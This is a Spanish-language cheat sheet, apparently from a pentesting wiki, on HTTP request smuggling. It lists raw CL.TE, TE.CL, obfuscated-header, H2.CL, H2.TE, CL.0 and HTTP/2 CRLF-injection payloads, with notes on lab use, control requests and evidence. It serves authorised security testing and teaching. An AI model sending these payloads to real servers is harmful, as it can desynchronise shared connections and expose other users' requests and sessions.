# 🗡️ HTTP Request Smuggling: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Framing normal como control

```http
POST / HTTP/1.1
Host: {LAB_AISLADO}
Content-Length: 0
Connection: close
```

**Cuándo usarlo:** Tomar una línea base con la misma conexión antes de probar ambigüedad.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/request-smuggling).


### CL.TE mínimo en laboratorio

```http
POST / HTTP/1.1
Host: {LAB_AISLADO}
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Cuándo usarlo:** Ejemplo esquemático para laboratorio: el cuerpo exacto es 0\r\n\r\nSMUGGLED (13 octetos). Enviar CRLF reales y desactivar la actualización automática de Content-Length.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/request-smuggling).


## 🧭 Payloads por contexto

### TE.CL mínimo en laboratorio

```http
POST / HTTP/1.1
Host: {LAB_AISLADO}
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

**Cuándo usarlo:** Ejemplo esquemático para laboratorio: el cuerpo debe terminar en 0\r\n\r\n; el formateo del bloque elimina ese terminador. Enviar CRLF reales, desactivar actualización automática de Content-Length y confirmar la frontera vista por cada servidor.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/request-smuggling).


## 🔥 Payloads avanzados

### HTTP/2 downgrade

```text
H2.CL: un Content-Length reenviado no coincide con el cuerpo de frames HTTP/2.
H2.TE: el frontend reenvía Transfer-Encoding a un backend HTTP/1.1.
CL.0: backend interpreta cuerpo declarado como siguiente request.
```

**Cuándo usarlo:** No hay bytes universales: registrar traducción real y demostrar desync entre solicitudes propias.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/request-smuggling/advanced).


## 🔬 Pruebas guiadas por escenario

### 1. CL.TE en laboratorio aislado

**Objetivo:** Frontend usa Content-Length y backend Transfer-Encoding.

```http
POST / HTTP/1.1
Host: {LAB_AISLADO}
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Interpretación:** Enviar bytes CRLF exactos con actualización automática de longitud desactivada. Jamás probar en conexión compartida sin autorización específica.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling).

### 2. TE.CL en laboratorio aislado

**Objetivo:** Frontend usa Transfer-Encoding y backend Content-Length.

```http
POST / HTTP/1.1
Host: {LAB_AISLADO}
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

**Interpretación:** El resultado depende del parser y bytes exactos; una respuesta anómala no prueba desync.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling).

### 3. TE obfuscado

**Objetivo:** Comprobar discrepancia por normalización de cabecera en laboratorio.

```http
POST / HTTP/1.1
Host: {LAB_AISLADO}
Content-Length: 13
Transfer-Encoding : chunked

0

SMUGGLED
```

**Interpretación:** El espacio antes de `:` debería rechazarse; comparar parsers y no afectar otras sesiones.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling).

### 4. Control sin ambigüedad

**Objetivo:** Descartar pipelining o simple reuse de conexión.

```http
POST / HTTP/1.1
Host: {LAB_AISLADO}
Content-Length: 0
Connection: close
```

**Interpretación:** Un control normal debe mantener fronteras de request. Revisar investigación de falsos positivos.

**Fuente técnica:** [PortSwigger](https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling).

### 5. CRLF en valor de cabecera HTTP/2

**Objetivo:** Probar si un gateway inserta CRLF del valor H2 como separador HTTP/1.1.

```text
En Burp Inspector HTTP/2: cabecera foo = bar\r\nX-Lab-Canary: {NONCE}
```

**Interpretación:** Introducir bytes CRLF reales en Inspector y observar en backend de laboratorio. Una cabecera nueva prueba discrepancia; para smuggling hace falta confirmar desync propio.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/request-smuggling/advanced).

### 6. CL.0

**Objetivo:** Comparar si backend ignora un cuerpo declarado.

```text
Burp Repeater en laboratorio: POST con Content-Length y cuerpo inocuo; segunda request propia en misma conexión.
```

**Interpretación:** Necesita prueba de desincronización de solicitudes propias; un 400 o timeout aislado no basta.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/request-smuggling/browser/cl-0).

### 7. Cierre de conexión como mitigación observable

**Objetivo:** Registrar si frontend cierra ante framing ambiguo.

```http
POST / HTTP/1.1
Host: {LAB_AISLADO}
Content-Length: 0
Transfer-Encoding: chunked
```

**Interpretación:** El rechazo y cierre son esperables; no inferir vulnerabilidad si se tolera la cabecera pero no hay desync.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/request-smuggling).

### 8. H2.CL en laboratorio

**Objetivo:** Comprobar discrepancia entre longitud de frame HTTP/2 y Content-Length reenviado.

```text
Burp Repeater: HTTP/2, cabecera Content-Length: 0, cuerpo canary propio; observar request HTTP/1.1 en backend del lab.
```

**Interpretación:** Depende del downgrade. Registrar bytes de backend y demostrar respuesta cruzada solo con clientes propios.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/request-smuggling/advanced).

### 9. H2.TE en laboratorio

**Objetivo:** Probar si un frontend HTTP/2 reenvía Transfer-Encoding al backend HTTP/1.1.

```text
Burp Repeater: HTTP/2 con Transfer-Encoding: chunked en un lab de downgrade; cuerpo canary y segunda request propia.
```

**Interpretación:** HTTP/2 no usa chunked; si se reenvía, confirmar desync con logs y aislamiento.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/request-smuggling/advanced).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
